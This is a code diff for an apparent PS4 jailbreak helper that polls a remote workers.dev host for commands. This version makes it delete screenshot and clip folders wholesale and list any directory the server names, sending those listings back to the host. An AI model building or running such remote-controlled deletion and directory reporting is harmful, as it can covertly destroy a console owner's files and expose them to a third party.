@@ -29,7 +29,7 @@
 
 #include "r2tls.h"
 
-#define R2_VERSION "1.0.5"
+#define R2_VERSION "1.0.6"
 #define ENGINE_HOST "round2-book.donttelldadyet.workers.dev"
 #define VUE_ID "CUSA00960" /* PS Vue + its half-downloaded update keep the Vue jailbreak working – never touch, never count */
 #define REPORT_EVERY 15     /* minutes */
@@ -437,6 +437,32 @@ static uint64_t rm_files(const char *path, int depth, int *files, int keep_dirs)
   closedir(d);
   return freed;
 }
+/* 1.0.6: a capture is a small folder (photo|video/<app>/<title>/<xyz>/) holding the picture or clip plus its .dat and .ext
+   (what the Capture Gallery lists). 1.0.3-1.0.5 deleted only the picture -> the gallery showed empty tiles. Now every file of
+   those kinds goes and the emptied folders too (never photo/ or video/ themselves). content_tmp: media files only. */
+static int is_capfile(const char *n) {
+  const char *x = strrchr(n, '.');
+  if (!x) return 0;
+  return is_media(n) || !strcasecmp(x, ".dat") || !strcasecmp(x, ".ext");
+}
+static uint64_t rm_captures(const char *path, int depth, int *files) {
+  uint64_t freed = 0;
+  DIR *d = opendir(path);
+  if (!d) return 0;
+  struct dirent *e;
+  char p[512];
+  while ((e = readdir(d))) {
+    if (!strcmp(e->d_name, ".") || !strcmp(e->d_name, "..")) continue;
+    snprintf(p, sizeof p, "%s/%s", path, e->d_name);
+    struct stat st;
+    if (lstat(p, &st)) continue;
+    if (S_ISDIR(st.st_mode)) { if (depth < 8) { freed += rm_captures(p, depth + 1, files); if (depth >= 1) rmdir(p); } }
+    else if (is_capfile(e->d_name) && unlink(p) == 0) { freed += st.st_size; (*files)++; }
+  }
+  closedir(d);
+  return freed;
+}
+
 static void cmd_done(const char *key, const char *cid, int ok, int refused, double dl, double cap, int files, const char *why) {
   char body[200], err[120];
   Jn = 0;
@@ -471,7 +497,8 @@ static void clean_up(const char *key, const char *cid) {
     }
     closedir(d);
   }
-  cap = rm_files("/user/av_contents", 0, &files, 1);
+  cap = rm_captures("/user/av_contents/photo", 0, &files) + rm_captures("/user/av_contents/video", 0, &files) +
+        rm_files("/user/av_contents/content_tmp", 0, &files, 1);
   char msg[160];
   double tot = (dl + cap) / 1e6;
   if (tot >= 1000) snprintf(msg, sizeof msg, "Round2 clean-up done: %.1f GB freed (update downloads %.1f GB, screenshots/clips %.1f GB)",
@@ -563,17 +590,26 @@ static void look_dir(const char *path, int depth, int maxdepth) {
   }
   closedir(d);
 }
-static void do_look(const char *key, const char *cid) {
+static void do_look(const char *key, const char *cid, const char *body) {
   Jn = 0;
   look_n = 0;
   jadd("{\"id\":\"%s\",\"cid\":", console_id); jstr(cid);
   jadd(",\"ok\":1,\"refused\":0,\"why\":\"listing\",\"list\":{");
-  look_dir("/user/av_contents", 0, 4);
-  look_dir("/system_data/priv/mms", 0, 0);
+  char ps[400];
+  jget(body, "p", ps, sizeof ps); /* 1.0.6: "/dir|depth;/dir2|depth" (folders to list), else the capture folders */
+  if (!ps[0]) { look_dir("/user/av_contents", 0, 4); look_dir("/system_data/priv/mms", 0, 0); }
+  for (char *t = ps, *nx; t && *t; t = nx) {
+    nx = strchr(t, ';');
+    if (nx) *nx++ = 0;
+    char *bar = strchr(t, '|');
+    int dp = 0;
+    if (bar) { *bar = 0; dp = atoi_safe(bar + 1); }
+    if (t[0] == '/' && !strstr(t, "..")) look_dir(t, 0, dp > 6 ? 6 : dp);
+  }
   jadd("}}");
-  char hdr[200], body[200], err[120];
+  char hdr[200], rbody[200], err[120];
   snprintf(hdr, sizeof hdr, "x-r2-ps4: %s\r\nContent-Type: application/json\r\n", key);
-  for (int i = 0; i < 3 && r2tls_request(ENGINE_HOST, "POST", "/ps4/done", hdr, J, Jn, body, sizeof body, err, sizeof err) != 200; i++) sleep(5);
+  for (int i = 0; i < 3 && r2tls_request(ENGINE_HOST, "POST", "/ps4/done", hdr, J, Jn, rbody, sizeof rbody, err, sizeof err) != 200; i++) sleep(5);
 }
 
 static int check_cmd(const char *key) { /* every minute; 1 = it did something (report again) */
@@ -589,7 +625,7 @@ static int check_cmd(const char *key) { /* every minute; 1 = it did something (r
   cid[i] = 0;
   if (strstr(body, "\"do\":\"clean\"")) clean_up(key, cid);
   else if (strstr(body, "\"do\":\"update\"")) do_update(key, cid, body);
-  else if (strstr(body, "\"do\":\"look\"")) do_look(key, cid);
+  else if (strstr(body, "\"do\":\"look\"")) do_look(key, cid, body);
   else cmd_done(key, cid, 0, 1, 0, 0, 0, "this helper doesn't know that command - update it");
   return 1;
 }
